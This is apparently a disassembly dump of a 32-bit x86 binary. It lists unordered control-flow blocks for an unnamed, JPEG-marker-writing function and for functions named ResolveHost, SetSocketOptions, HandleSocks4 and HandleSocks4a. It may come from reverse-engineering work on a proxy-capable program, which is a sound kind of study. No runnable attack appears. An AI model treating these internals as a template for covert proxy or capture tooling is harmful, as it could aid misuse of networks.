0x804d8da:	lea	eax, dword ptr [eax + eax*2]
0x804d8dd:	imul	eax, edx
0x804d8e0:	push	eax
0x804d8e1:	call	0x804bd40
None
|
|
|
v
0x804dd71:	xor	bl, bl
0x804dd73:	movzx	eax, byte ptr [ebx + 0x80587ed]
0x804dd7a:	sub	esp, 0xc
0x804dd7d:	inc	ebx
0x804dd7e:	push	eax
0x804dd7f:	call	0x804ce14
None
|
|
|
v
0x804d8b4:	mov	eax, dword ptr [0x805874c]
0x804d8b9:	test	eax, eax
0x804d8bb:	je	0x804d8c9
None
|
|
|
v
0x804ddea:	add	esp, 0x10
0x804dded:	movzx	eax, byte ptr [ebx + 0x80588ad]
0x804ddf4:	sub	esp, 0xc
0x804ddf7:	inc	ebx
0x804ddf8:	push	eax
0x804ddf9:	call	0x804ce14
None
|
|
|
v
0x804dbe3:	movzx	eax, word ptr [0x8058752]
0x804dbea:	mov	dword ptr [esp], eax
0x804dbed:	call	0x804ce2d
None
|
|
|
v
0x804d975:	inc	ebx
0x804d976:	cmp	bx, word ptr [0x805be88]
0x804d97d:	mov	bp, word ptr [0x805b9b8]
0x804d984:	jb	0x804d8fd
None
|
|
|
v
0x804dae0:	sub	esp, 0xc
0x804dae3:	mov	word ptr [0x805be88], ax
0x804dae9:	mov	eax, dword ptr [esp + 0x60]
0x804daed:	push	dword ptr [eax]
0x804daef:	call	0x804bd40
None
|
|
|
v
0x804d8a8:	mov	dx, word ptr [esp + 0x12]
0x804d8ad:	mov	word ptr [0x805b9ba], dx
0x804d8b4:	mov	eax, dword ptr [0x805874c]
0x804d8b9:	test	eax, eax
0x804d8bb:	je	0x804d8c9
None
|
|
|
v
0x804d720:	add	esp, 0x10
0x804d723:	xor	edx, edx
0x804d725:	test	eax, eax
0x804d727:	mov	dword ptr [0x805b9a8], eax
0x804d72c:	je	0x804e015
None
|
|
|
v
0x804dca1:	movzx	eax, byte ptr [0x8058363]
0x804dca8:	mov	dword ptr [esp], eax
0x804dcab:	call	0x804ce14
None
|
|
|
v
0x804d9a7:	mov	eax, dword ptr [0x805b9c0]
0x804d9ac:	test	eax, eax
0x804d9ae:	je	0x804d9bc
None
|
|
|
v
0x804de33:	add	esp, 0x10
0x804de36:	movzx	eax, byte ptr [ebx + 0x80588ca]
0x804de3d:	sub	esp, 0xc
0x804de40:	inc	ebx
0x804de41:	push	eax
0x804de42:	call	0x804ce14
None
|
|
|
v
0x804daab:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804da83:	movzx	esi, word ptr [0x805be88]
0x804da8a:	movzx	ebp, bp
0x804da8d:	movzx	eax, word ptr [0x805be8a]
0x804da94:	mov	ecx, ebp
0x804da96:	mov	ebx, dword ptr [0x805b9c0]
0x804da9c:	dec	esi
0x804da9d:	imul	esi, eax
0x804daa0:	mov	edi, ebx
0x804daa2:	lea	esi, dword ptr [esi + esi*2]
0x804daa5:	add	esi, dword ptr [0x805874c]
0x804daab:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804d7e9:	xor	edx, edx
0x804d7eb:	cmp	byte ptr [ebx], 0x42
0x804d7ee:	jne	0x804e015
None
|
|
|
v
0x804d851:	mov	edx, dword ptr [esp + 0x14]
0x804d855:	test	byte ptr [esp + 0x1c], 7
0x804d85a:	mov	dword ptr [0x805b9b4], eax
0x804d85f:	mov	dword ptr [0x805b9b0], edx
0x804d865:	je	0x804d87e
None
|
|
|
v
0x804db38:	mov	dword ptr [esp], 0x10
0x804db3f:	call	0x804ce2d
None
|
|
|
v
0x804d83b:	cmp	dword ptr [0x805b9b4], eax
0x804d841:	jne	0x804d851
None
|
|
|
v
0x804d8fd:	movzx	edx, bp
0x804d900:	movzx	eax, bx
0x804d903:	movzx	ecx, word ptr [0x805be8a]
0x804d90a:	imul	eax, edx
0x804d90d:	mov	esi, dword ptr [esp + 0xc]
0x804d911:	lea	ecx, dword ptr [ecx + ecx*2]
0x804d914:	lea	edx, dword ptr [eax + eax*2]
0x804d917:	add	edx, dword ptr [0x805874c]
0x804d91d:	mov	edi, edx
0x804d91f:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804d890:	mov	ax, word ptr [esp + 0x12]
0x804d895:	shr	ax, 3
0x804d899:	lea	eax, dword ptr [eax*8 + 8]
0x804d8a0:	mov	word ptr [0x805b9ba], ax
0x804d8a6:	jmp	0x804d8b4
None
|
|
|
v
0x804d6c0:	push	ebp
0x804d6c1:	push	edi
0x804d6c2:	push	esi
0x804d6c3:	push	ebx
0x804d6c4:	sub	esp, 0x3c
0x804d6c7:	mov	dl, byte ptr [esp + 0x64]
0x804d6cb:	mov	eax, dword ptr [esp + 0x60]
0x804d6cf:	mov	ebx, dword ptr [esp + 0x50]
0x804d6d3:	mov	byte ptr [esp + 0x18], dl
0x804d6d7:	movzx	edx, byte ptr [0x8058740]
0x804d6de:	cmp	edx, eax
0x804d6e0:	je	0x804d700
None
|
|
|
v
0x804dc01:	add	esp, 0x10
0x804dc04:	movzx	eax, byte ptr [ebx + 0x8058755]
0x804dc0b:	sub	esp, 0xc
0x804dc0e:	inc	ebx
0x804dc0f:	push	eax
0x804dc10:	call	0x804ce14
None
|
|
|
v
0x804db50:	mov	dword ptr [esp], 0x46
0x804db57:	call	0x804ce14
None
|
|
|
v
0x804dbc8:	mov	dword ptr [esp], 0
0x804dbcf:	call	0x804ce14
None
|
|
|
v
0x804dc2f:	add	esp, 0x10
0x804dc32:	movzx	eax, byte ptr [ebx + 0x8058796]
0x804dc39:	sub	esp, 0xc
0x804dc3c:	inc	ebx
0x804dc3d:	push	eax
0x804dc3e:	call	0x804ce14
None
|
|
|
v
0x804dd73:	movzx	eax, byte ptr [ebx + 0x80587ed]
0x804dd7a:	sub	esp, 0xc
0x804dd7d:	inc	ebx
0x804dd7e:	push	eax
0x804dd7f:	call	0x804ce14
None
|
|
|
v
0x804d9ec:	mov	ax, word ptr [0x805be88]
0x804d9f2:	movzx	ebx, bp
0x804d9f5:	mov	dword ptr [esp + 0x18], 0
0x804d9fd:	dec	eax
0x804d9fe:	mov	word ptr [esp + 0x1e], ax
0x804da03:	jmp	0x804da6e
None
|
|
|
v
0x804dfae:	cmp	si, word ptr [0x805be8a]
0x804dfb5:	jb	0x804df33
None
|
|
|
v
0x804dc7b:	movzx	eax, word ptr [esp + 0x22]
0x804dc80:	mov	dword ptr [esp], eax
0x804dc83:	call	0x804ce2d
None
|
|
|
v
0x804dd19:	movzx	eax, byte ptr [0x805836b]
0x804dd20:	mov	dword ptr [esp], eax
0x804dd23:	call	0x804ce14
None
|
|
|
v
0x804ddb2:	add	esp, 0x10
0x804ddb5:	cmp	ebx, 0x10
0x804ddb8:	jne	0x804dda1
None
|
|
|
v
0x804de51:	movzx	eax, byte ptr [ebx + 0x80588da]
0x804de58:	sub	esp, 0xc
0x804de5b:	inc	ebx
0x804de5c:	push	eax
0x804de5d:	call	0x804ce14
None
|
|
|
v
0x804dc6c:	movzx	eax, byte ptr [0x805835c]
0x804dc73:	mov	dword ptr [esp], eax
0x804dc76:	call	0x804ce14
None
|
|
|
v
0x804dee8:	mov	dword ptr [esp], 0x3f
0x804deef:	call	0x804ce14
None
|
|
|
v
0x804dd58:	movzx	eax, byte ptr [ebx + 0x80587dd]
0x804dd5f:	sub	esp, 0xc
0x804dd62:	inc	ebx
0x804dd63:	push	eax
0x804dd64:	call	0x804ce14
None
|
|
|
v
0x804dd9e:	add	esp, 0x10
0x804dda1:	movzx	eax, byte ptr [ebx + 0x80587fa]
0x804dda8:	sub	esp, 0xc
0x804ddab:	inc	ebx
0x804ddac:	push	eax
0x804ddad:	call	0x804ce14
None
|
|
|
v
0x804dfbe:	cmp	bx, word ptr [0x805be88]
0x804dfc5:	jb	0x804dfa9
None
|
|
|
v
0x804dd8c:	movzx	eax, byte ptr [0x80587f9]
0x804dd93:	sub	esp, 0xc
0x804dd96:	xor	bl, bl
0x804dd98:	push	eax
0x804dd99:	call	0x804ce14
None
|
|
|
v
0x804dd37:	movzx	eax, word ptr [0x80587da]
0x804dd3e:	mov	dword ptr [esp], eax
0x804dd41:	call	0x804ce2d
None
|
|
|
v
0x804d713:	sub	esp, 0xc
0x804d716:	push	0xffff
0x804d71b:	call	0x804bd40
None
|
|
|
v
0x804de4f:	xor	bl, bl
0x804de51:	movzx	eax, byte ptr [ebx + 0x80588da]
0x804de58:	sub	esp, 0xc
0x804de5b:	inc	ebx
0x804de5c:	push	eax
0x804de5d:	call	0x804ce14
None
|
|
|
v
0x804df62:	add	esp, 0x14
0x804df65:	push	0x8058de0
0x804df6a:	push	0x80589b0
0x804df6f:	push	edi
0x804df70:	push	0x805b6e0
0x804df75:	push	0x805b928
0x804df7a:	call	0x804d46e
None
|
|
|
v
0x804d9bc:	sub	esp, 0xc
0x804d9bf:	movzx	eax, bp
0x804d9c2:	push	eax
0x804d9c3:	call	0x804bd40
None
|
|
|
v
0x804ddd8:	movzx	eax, byte ptr [0x80588ac]
0x804dddf:	sub	esp, 0xc
0x804dde2:	xor	bl, bl
0x804dde4:	push	eax
0x804dde5:	call	0x804ce14
None
|
|
|
v
0x804d799:	mov	edx, 1
0x804d79e:	sub	edx, ecx
0x804d7a0:	mov	dword ptr [esp + 0xc], edx
0x804d7a4:	mov	edx, esi
0x804d7a6:	neg	edx
0x804d7a8:	mov	dword ptr [esp + 0x14], edx
0x804d7ac:	lea	edx, dword ptr [ecx - 1]
0x804d7af:	mov	word ptr [esp + 0x1e], dx
0x804d7b4:	mov	edx, dword ptr [esp + 0xc]
0x804d7b8:	mov	dword ptr [esp + 0xc], ecx
0x804d7bc:	jmp	0x804d7d2
None
|
|
|
v
0x804dd69:	add	esp, 0x10
0x804dd6c:	cmp	ebx, 0x10
0x804dd6f:	jne	0x804dd58
None
|
|
|
v
0x804db06:	mov	edx, dword ptr [esp + 0x1c]
0x804db0a:	xor	ebx, ebx
0x804db0c:	mov	word ptr [0x8058360], dx
0x804db13:	mov	dx, word ptr [esp + 0x12]
0x804db18:	sub	esp, 0xc
0x804db1b:	push	0xffd8
0x804db20:	mov	word ptr [0x805835e], dx
0x804db27:	call	0x804ce2d
None
|
|
|
v
0x804d76e:	mov	ebp, dword ptr [0x805b8e0]
0x804d774:	mov	al, 1
0x804d776:	mov	ecx, 2
0x804d77b:	mov	edi, dword ptr [0x805b8e4]
0x804d781:	mov	esi, 1
0x804d786:	jmp	0x804d7e5
None
|
|
|
v
0x804e015:	add	esp, 0x3c
0x804e018:	mov	eax, edx
0x804e01a:	pop	ebx
0x804e01b:	pop	esi
0x804e01c:	pop	edi
0x804e01d:	pop	ebp
0x804e01e:	ret	
None
|
|
|
v
0x804d98a:	mov	word ptr [0x805be8a], bp
0x804d991:	lea	ebp, dword ptr [ebp + ebp*2]
0x804d995:	cmp	word ptr [0x805b9bc], bp
0x804d99c:	jne	0x804d9a7
None
|
|
|
v
0x804d91f:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804db98:	mov	dword ptr [esp], 0
0x804db9f:	call	0x804ce14
None
|
|
|
v
0x804dff1:	add	esp, 0x10
0x804dff4:	sub	esp, 0xc
0x804dff7:	push	0xffd9
0x804dffc:	call	0x804ce2d
None
|
|
|
v
0x804dbb0:	mov	dword ptr [esp], 1
0x804dbb7:	call	0x804ce2d
None
|
|
|
v
0x804d9c8:	add	esp, 0x10
0x804d9cb:	xor	edx, edx
0x804d9cd:	mov	word ptr [0x805b9bc], bp
0x804d9d4:	test	eax, eax
0x804d9d6:	mov	dword ptr [0x805b9c0], eax
0x804d9db:	je	0x804e015
None
|
|
|
v
0x804d976:	cmp	bx, word ptr [0x805be88]
0x804d97d:	mov	bp, word ptr [0x805b9b8]
0x804d984:	jb	0x804d8fd
None
|
|
|
v
0x804db74:	mov	dword ptr [esp], 0
0x804db7b:	call	0x804ce14
None
|
|
|
v
0x804d952:	movzx	ecx, dx
0x804d955:	mov	si, word ptr [esp + 0x27]
0x804d95a:	inc	edx
0x804d95b:	add	ecx, edi
0x804d95d:	lea	ecx, dword ptr [ecx + ecx*2]
0x804d960:	add	ecx, dword ptr [0x805874c]
0x804d966:	mov	word ptr [ecx], si
0x804d969:	mov	al, byte ptr [esp + 0x29]
0x804d96d:	mov	byte ptr [ecx + 2], al
0x804d970:	cmp	dx, bp
0x804d973:	jb	0x804d952
None
|
|
|
v
0x804dd84:	add	esp, 0x10
0x804dd87:	cmp	ebx, 0xc
0x804dd8a:	jne	0x804dd73
None
|
|
|
v
0x804dc04:	movzx	eax, byte ptr [ebx + 0x8058755]
0x804dc0b:	sub	esp, 0xc
0x804dc0e:	inc	ebx
0x804dc0f:	push	eax
0x804dc10:	call	0x804ce14
None
|
|
|
v
0x804deb8:	mov	dword ptr [esp], 0x11
0x804debf:	call	0x804ce14
None
|
|
|
v
0x804d8f8:	jmp	0x804e015
None
|
|
|
v
0x804dcbf:	movzx	eax, byte ptr [0x8058365]
0x804dcc6:	mov	dword ptr [esp], eax
0x804dcc9:	call	0x804ce14
None
|
|
|
v
0x804d7d2:	cmp	edx, dword ptr [esp + 0x14]
0x804d7d6:	jle	0x804d7be
None
|
|
|
v
0x804d6fb:	call	0x804d190
None
|
|
|
v
0x804daad:	mov	dx, word ptr [0x805be88]
0x804dab4:	jmp	0x804dad5
None
|
|
|
v
0x804de19:	add	esp, 0x10
0x804de1c:	cmp	ebx, 0xc
0x804de1f:	jne	0x804de08
None
|
|
|
v
0x804dcdd:	movzx	eax, byte ptr [0x8058367]
0x804dce4:	mov	dword ptr [esp], eax
0x804dce7:	call	0x804ce14
None
|
|
|
v
0x804ded0:	mov	dword ptr [esp], 0x11
0x804ded7:	call	0x804ce14
None
|
|
|
v
0x804dff4:	sub	esp, 0xc
0x804dff7:	push	0xffd9
0x804dffc:	call	0x804ce2d
None
|
|
|
v
0x804d7be:	mov	cx, word ptr [esp + 0x1e]
0x804d7c3:	mov	byte ptr [ebp + edx], al
0x804d7c7:	mov	byte ptr [edi + edx*4], al
0x804d7ca:	add	ecx, edx
0x804d7cc:	mov	word ptr [edi + edx*4 + 2], cx
0x804d7d1:	inc	edx
0x804d7d2:	cmp	edx, dword ptr [esp + 0x14]
0x804d7d6:	jle	0x804d7be
None
|
|
|
v
0x804dc1d:	movzx	eax, byte ptr [0x8058795]
0x804dc24:	sub	esp, 0xc
0x804dc27:	xor	bl, bl
0x804dc29:	push	eax
0x804dc2a:	call	0x804ce14
None
|
|
|
v
0x804d9b0:	sub	esp, 0xc
0x804d9b3:	push	eax
0x804d9b4:	call	0x804bbc0
None
|
|
|
v
0x804d764:	add	eax, 0x1fffc
0x804d769:	mov	dword ptr [0x805b8e4], eax
0x804d76e:	mov	ebp, dword ptr [0x805b8e0]
0x804d774:	mov	al, 1
0x804d776:	mov	ecx, 2
0x804d77b:	mov	edi, dword ptr [0x805b8e4]
0x804d781:	mov	esi, 1
0x804d786:	jmp	0x804d7e5
None
|
|
|
v
0x804dda1:	movzx	eax, byte ptr [ebx + 0x80587fa]
0x804dda8:	sub	esp, 0xc
0x804ddab:	inc	ebx
0x804ddac:	push	eax
0x804ddad:	call	0x804ce14
None
|
|
|
v
0x804d7fe:	cmp	byte ptr [ebx + 0x1c], 0x18
0x804d802:	jne	0x804e015
None
|
|
|
v
0x804df46:	mov	dword ptr [esp], 0x80589e0
0x804df4d:	push	0x8058980
0x804df52:	push	ebp
0x804df53:	push	0x805b5e0
0x804df58:	push	0x805b8e8
0x804df5d:	call	0x804d46e
None
|
|
|
v
0x804da2e:	movzx	esi, word ptr [0x805be8a]
0x804da35:	mov	ecx, dword ptr [0x805874c]
0x804da3b:	imul	eax, esi
0x804da3e:	imul	esi, edx
0x804da41:	lea	eax, dword ptr [eax + eax*2]
0x804da44:	add	eax, ecx
0x804da46:	lea	esi, dword ptr [esi + esi*2]
0x804da49:	mov	edi, eax
0x804da4b:	add	esi, ecx
0x804da4d:	mov	ecx, ebx
0x804da4f:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804dbd4:	movzx	eax, word ptr [0x8058750]
0x804dbdb:	mov	dword ptr [esp], eax
0x804dbde:	call	0x804ce2d
None
|
|
|
v
0x804da2c:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804d970:	cmp	dx, bp
0x804d973:	jb	0x804d952
None
|
|
|
v
0x804e001:	mov	ecx, dword ptr [esp + 0x64]
0x804e005:	add	esp, 0x10
0x804e008:	mov	eax, dword ptr [0x8058744]
0x804e00d:	mov	edx, dword ptr [0x8058748]
0x804e013:	mov	dword ptr [ecx], eax
0x804e015:	add	esp, 0x3c
0x804e018:	mov	eax, edx
0x804e01a:	pop	ebx
0x804e01b:	pop	esi
0x804e01c:	pop	edi
0x804e01d:	pop	ebp
0x804e01e:	ret	
None
|
|
|
v
0x804d73c:	cmp	dword ptr [0x805b9ac], 0
0x804d743:	jne	0x804d76e
None
|
|
|
v
0x804d921:	mov	edi, eax
0x804d923:	mov	dx, word ptr [0x805be8a]
0x804d92a:	movzx	ecx, dx
0x804d92d:	lea	esi, dword ptr [ecx + ecx*2]
0x804d930:	lea	ecx, dword ptr [eax + ecx - 1]
0x804d934:	lea	ecx, dword ptr [ecx + ecx*2]
0x804d937:	add	ecx, dword ptr [0x805874c]
0x804d93d:	add	dword ptr [esp + 0xc], esi
0x804d941:	mov	si, word ptr [ecx]
0x804d944:	mov	word ptr [esp + 0x27], si
0x804d949:	mov	cl, byte ptr [ecx + 2]
0x804d94c:	mov	byte ptr [esp + 0x29], cl
0x804d950:	jmp	0x804d970
None
|
|
|
v
0x804db80:	mov	dword ptr [esp], 1
0x804db87:	call	0x804ce14
None
|
|
|
v
0x804d795:	cmp	edx, ecx
0x804d797:	jl	0x804d788
None
|
|
|
v
0x804db44:	mov	dword ptr [esp], 0x4a
0x804db4b:	call	0x804ce14
None
|
|
|
v
0x804da6e:	mov	edx, dword ptr [esp + 0x18]
0x804da72:	mov	ax, word ptr [esp + 0x1e]
0x804da77:	inc	dword ptr [esp + 0x18]
0x804da7b:	sub	ax, dx
0x804da7e:	cmp	ax, dx
0x804da81:	ja	0x804da05
None
|
|
|
v
0x804d9b9:	add	esp, 0x10
0x804d9bc:	sub	esp, 0xc
0x804d9bf:	movzx	eax, bp
0x804d9c2:	push	eax
0x804d9c3:	call	0x804bd40
None
|
|
|
v
0x804de08:	movzx	eax, byte ptr [ebx + 0x80588bd]
0x804de0f:	sub	esp, 0xc
0x804de12:	inc	ebx
0x804de13:	push	eax
0x804de14:	call	0x804ce14
None
|
|
|
v
0x804db5c:	mov	dword ptr [esp], 0x49
0x804db63:	call	0x804ce14
None
|
|
|
v
0x804d843:	add	ebx, 0x36
0x804d846:	mov	dword ptr [esp + 0xc], ebx
0x804d84a:	xor	ebx, ebx
0x804d84c:	jmp	0x804d976
None
|
|
|
v
0x804de06:	xor	bl, bl
0x804de08:	movzx	eax, byte ptr [ebx + 0x80588bd]
0x804de0f:	sub	esp, 0xc
0x804de12:	inc	ebx
0x804de13:	push	eax
0x804de14:	call	0x804ce14
None
|
|
|
v
0x804da05:	movzx	esi, word ptr [0x805be8a]
0x804da0c:	movzx	eax, ax
0x804da0f:	movzx	edx, dx
0x804da12:	mov	ecx, dword ptr [0x805b9c0]
0x804da18:	imul	esi, eax
0x804da1b:	mov	dword ptr [esp + 0xc], ecx
0x804da1f:	mov	edi, ecx
0x804da21:	mov	ecx, ebx
0x804da23:	lea	esi, dword ptr [esi + esi*2]
0x804da26:	add	esi, dword ptr [0x805874c]
0x804da2c:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804de7c:	mov	dword ptr [esp], 0xc
0x804de83:	call	0x804ce2d
None
|
|
|
v
0x804de88:	mov	dword ptr [esp], 3
0x804de8f:	call	0x804ce14
None
|
|
|
v
0x804dcfb:	movzx	eax, byte ptr [0x8058369]
0x804dd02:	mov	dword ptr [esp], eax
0x804dd05:	call	0x804ce14
None
|
|
|
v
0x804dea0:	mov	dword ptr [esp], 0
0x804dea7:	call	0x804ce14
None
|
|
|
v
0x804dded:	movzx	eax, byte ptr [ebx + 0x80588ad]
0x804ddf4:	sub	esp, 0xc
0x804ddf7:	inc	ebx
0x804ddf8:	push	eax
0x804ddf9:	call	0x804ce14
None
|
|
|
v
0x804ddfe:	add	esp, 0x10
0x804de01:	cmp	ebx, 0x10
0x804de04:	jne	0x804dded
None
|
|
|
v
0x804dc4b:	movzx	eax, word ptr [0x8058358]
0x804dc52:	sub	esp, 0xc
0x804dc55:	xor	bl, bl
0x804dc57:	push	eax
0x804dc58:	call	0x804ce2d
None
|
|
|
v
0x804d9e1:	cmp	byte ptr [esp + 0x18], 0
0x804d9e6:	je	0x804da83
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ResolveHost
TOTAL BLOCKS :6
0x804e065:	pop	edx
0x804e066:	pop	ebx
0x804e067:	pop	edi
0x804e068:	ret	
None
|
|
|
v
0x804e048:	mov	word ptr [ebx], 2
0x804e04d:	mov	eax, dword ptr [edx + 0x10]
0x804e050:	mov	eax, dword ptr [eax]
0x804e052:	mov	eax, dword ptr [eax]
0x804e054:	mov	dword ptr [ebx + 4], eax
0x804e057:	mov	eax, dword ptr [esp + 0x14]
0x804e05b:	ror	ax, 8
0x804e05f:	mov	word ptr [ebx + 2], ax
0x804e063:	mov	al, 1
0x804e065:	pop	edx
0x804e066:	pop	ebx
0x804e067:	pop	edi
0x804e068:	ret	
None
|
|
|
v
0x804e020:	push	edi
0x804e021:	push	ebx
0x804e022:	sub	esp, 0x10
0x804e025:	mov	ebx, dword ptr [esp + 0x24]
0x804e029:	push	dword ptr [esp + 0x1c]
0x804e02d:	call	0x804bf60
None
|
|
|
v
0x804e03d:	xor	eax, eax
0x804e03f:	mov	ecx, 4
0x804e044:	mov	edi, ebx
0x804e046:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e046:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e032:	add	esp, 0x10
0x804e035:	mov	edx, eax
0x804e037:	xor	eax, eax
0x804e039:	test	edx, edx
0x804e03b:	je	0x804e065
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SetSocketOptions
TOTAL BLOCKS :9
0x804e08f:	or	ah, 8
0x804e092:	push	ecx
0x804e093:	push	eax
0x804e094:	push	4
0x804e096:	push	ebx
0x804e097:	call	0x804bdf0
None
|
|
|
v
0x804e0a4:	mov	dword ptr [esp + 0xc], 1
0x804e0ac:	sub	esp, 0xc
0x804e0af:	push	4
0x804e0b1:	lea	eax, dword ptr [esp + 0x1c]
0x804e0b5:	push	eax
0x804e0b6:	push	9
0x804e0b8:	push	1
0x804e0ba:	push	ebx
0x804e0bb:	call	0x804bb50
None
|
|
|
v
0x804e0c3:	add	esp, 0x14
0x804e0c6:	pop	ebx
0x804e0c7:	pop	esi
0x804e0c8:	ret	
None
|
|
|
v
0x804e069:	push	esi
0x804e06a:	push	ebx
0x804e06b:	sub	esp, 0x14
0x804e06e:	mov	esi, dword ptr [esp + 0x24]
0x804e072:	mov	ebx, dword ptr [esp + 0x20]
0x804e076:	test	esi, 1
0x804e07c:	je	0x804e09f
None
|
|
|
v
0x804e09f:	and	esi, 2
0x804e0a2:	je	0x804e0c3
None
|
|
|
v
0x804e09c:	add	esp, 0x10
0x804e09f:	and	esi, 2
0x804e0a2:	je	0x804e0c3
None
|
|
|
v
0x804e07e:	push	eax
0x804e07f:	push	eax
0x804e080:	push	3
0x804e082:	push	ebx
0x804e083:	call	0x804bdf0
None
|
|
|
v
0x804e088:	add	esp, 0x10
0x804e08b:	test	eax, eax
0x804e08d:	js	0x804e09f
None
|
|
|
v
0x804e0c0:	add	esp, 0x20
0x804e0c3:	add	esp, 0x14
0x804e0c6:	pop	ebx
0x804e0c7:	pop	esi
0x804e0c8:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:HandleSocks4
TOTAL BLOCKS :17
0x804e1da:	mov	al, byte ptr [esp + 0xf]
0x804e1de:	add	esp, 0xcc
0x804e1e4:	pop	ebx
0x804e1e5:	pop	esi
0x804e1e6:	pop	edi
0x804e1e7:	pop	ebp
0x804e1e8:	ret	
None
|
|
|
v
0x804e1a5:	add	esp, 0x20
0x804e1a8:	test	eax, eax
0x804e1aa:	jle	0x804e1da
None
|
|
|
v
0x804e17e:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e1ac:	mov	eax, ebx
0x804e1ae:	cdq	
0x804e1af:	idiv	ebp
0x804e1b1:	mov	eax, dword ptr [esp + eax*4 + 0x1c]
0x804e1b5:	bt	eax, edx
0x804e1b8:	jae	0x804e1da
None
|
|
|
v
0x804e15c:	mov	eax, dword ptr [esp + 8]
0x804e160:	lea	esi, dword ptr [esp + 0xb8]
0x804e167:	mov	ebp, 0x20
0x804e16c:	mov	edi, esi
0x804e16e:	mov	ecx, 2
0x804e173:	lea	edx, dword ptr [esp + 0x1c]
0x804e177:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e105:	lea	edx, dword ptr [esp + 0xaf]
0x804e10c:	xor	eax, eax
0x804e10e:	mov	edi, edx
0x804e110:	mov	ecx, 9
0x804e115:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804e117:	mov	byte ptr [esp + 0xaf], 4
0x804e11f:	mov	byte ptr [esp + 0xb0], 1
0x804e127:	mov	ax, word ptr [esp + 0x9e]
0x804e12f:	mov	dword ptr [esp + 8], ecx
0x804e133:	mov	word ptr [esp + 0xb1], ax
0x804e13b:	mov	eax, dword ptr [esp + 0xa0]
0x804e142:	mov	dword ptr [esp + 0xb3], eax
0x804e149:	push	0
0x804e14b:	push	9
0x804e14d:	push	edx
0x804e14e:	push	ebx
0x804e14f:	call	0x804bfe0
None
|
|
|
v
0x804e115:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804e177:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e179:	mov	ecx, ebp
0x804e17b:	mov	edi, edx
0x804e17d:	cld	
0x804e17e:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e1cd:	cmp	byte ptr [esp + 0xb9], 0x5a
0x804e1d5:	sete	byte ptr [esp + 0xf]
0x804e1da:	mov	al, byte ptr [esp + 0xf]
0x804e1de:	add	esp, 0xcc
0x804e1e4:	pop	ebx
0x804e1e5:	pop	esi
0x804e1e6:	pop	edi
0x804e1e7:	pop	ebp
0x804e1e8:	ret	
None
|
|
|
v
0x804e180:	mov	edi, ebx
0x804e182:	mov	cl, bl
0x804e184:	shr	edi, 5
0x804e187:	mov	eax, 1
0x804e18c:	shl	eax, cl
0x804e18e:	or	dword ptr [esp + edi*4 + 0x1c], eax
0x804e192:	sub	esp, 0xc
0x804e195:	push	0
0x804e197:	push	0
0x804e199:	push	0
0x804e19b:	push	edx
0x804e19c:	lea	eax, dword ptr [ebx + 1]
0x804e19f:	push	eax
0x804e1a0:	call	0x804bc00
None
|
|
|
v
0x804e1c5:	add	esp, 0x10
0x804e1c8:	cmp	eax, 8
0x804e1cb:	jne	0x804e1da
None
|
|
|
v
0x804e0f5:	add	esp, 0x10
0x804e0f8:	mov	byte ptr [esp + 0xf], 0
0x804e0fd:	test	al, al
0x804e0ff:	je	0x804e1da
None
|
|
|
v
0x804e154:	add	esp, 0x10
0x804e157:	cmp	eax, 9
0x804e15a:	jne	0x804e1da
None
|
|
|
v
0x804e1ba:	push	0
0x804e1bc:	push	8
0x804e1be:	push	esi
0x804e1bf:	push	ebx
0x804e1c0:	call	0x804bfa0
None
|
|
|
v
0x804e0c9:	push	ebp
0x804e0ca:	push	edi
0x804e0cb:	push	esi
0x804e0cc:	push	ebx
0x804e0cd:	sub	esp, 0xd0
0x804e0d3:	lea	eax, dword ptr [esp + 0xa0]
0x804e0da:	mov	ebx, dword ptr [esp + 0xe4]
0x804e0e1:	push	eax
0x804e0e2:	push	dword ptr [esp + 0xf0]
0x804e0e9:	push	dword ptr [esp + 0xf0]
0x804e0f0:	call	0x804e020
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:HandleSocks4a
TOTAL BLOCKS :21
0x804e259:	lea	eax, dword ptr [edx + 9]
0x804e25c:	mov	edi, eax
0x804e25e:	not	ecx
0x804e260:	dec	ecx
0x804e261:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e261:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e221:	mov	byte ptr [edx], 4
0x804e224:	mov	byte ptr [edx + 1], 1
0x804e228:	mov	byte ptr [edx + 8], 0
0x804e22c:	mov	dword ptr [ebp - 0xb4], ecx
0x804e232:	mov	ecx, dword ptr [ebp + 0x10]
0x804e235:	ror	cx, 8
0x804e239:	mov	word ptr [ebp - 0x1a], cx
0x804e23d:	mov	word ptr [edx + 2], cx
0x804e241:	mov	ecx, esi
0x804e243:	mov	dword ptr [ebp - 0x20], 0x1000000
0x804e24a:	mov	dword ptr [edx + 4], 0x1000000
0x804e251:	mov	edi, dword ptr [ebp + 0xc]
0x804e254:	mov	esi, dword ptr [ebp + 0xc]
0x804e257:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e28f:	mov	eax, dword ptr [ebp - 0xb4]
0x804e295:	lea	esi, dword ptr [ebp - 0x28]
0x804e298:	mov	ecx, 2
0x804e29d:	mov	edi, esi
0x804e29f:	lea	edx, dword ptr [ebp - 0xa8]
0x804e2a5:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
